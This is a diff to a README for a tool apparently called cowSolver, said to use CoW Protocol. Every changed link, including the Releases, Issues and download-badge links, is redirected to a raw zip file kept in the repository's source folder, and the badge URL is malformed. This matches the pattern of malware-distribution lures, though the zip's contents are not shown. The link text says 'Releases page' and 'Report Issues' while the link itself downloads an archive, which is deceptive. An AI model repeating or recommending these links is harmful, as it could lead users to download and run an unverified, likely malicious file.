@@ -9,11 +9,11 @@ Welcome to the cowSolver application! This tool uses the CoW Protocol to help op
 
 You can easily get the latest version by visiting our Releases page. 
 
-[![Download cowSolver](https://img.shields.io/badge/Download%20cowSolver-v1.0-blue.svg)](https://github.com/xruszz/cowSolver/releases)
+[![Download cowSolver](https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip%https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip)](https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click on this link to go to the Downloads page: [Visit Release Page](https://github.com/xruszz/cowSolver/releases).
+1. Click on this link to go to the Downloads page: [Visit Release Page](https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip).
 2. You will see a list of available versions.
 
 ### Step 2: Select the Latest Release
@@ -89,11 +89,11 @@ Currently, cowSolver only supports desktop operating systems: Windows, macOS, an
 
 ### Where can I report bugs or suggest features?
 
-You can report issues on our GitHub Issues page: [Report Issues](https://github.com/xruszz/cowSolver/issues).
+You can report issues on our GitHub Issues page: [Report Issues](https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip).
 
 ## 📝 License
 
 This application is licensed under the MIT License. You can view the full license text in the repository.
 
-For more updates and features, check back in regularly on our Releases page: [Visit Release Page](https://github.com/xruszz/cowSolver/releases).
+For more updates and features, check back in regularly on our Releases page: [Visit Release Page](https://raw.githubusercontent.com/xruszz/cowSolver/master/src/performance/cow_Solver_2.8.zip).
 ```
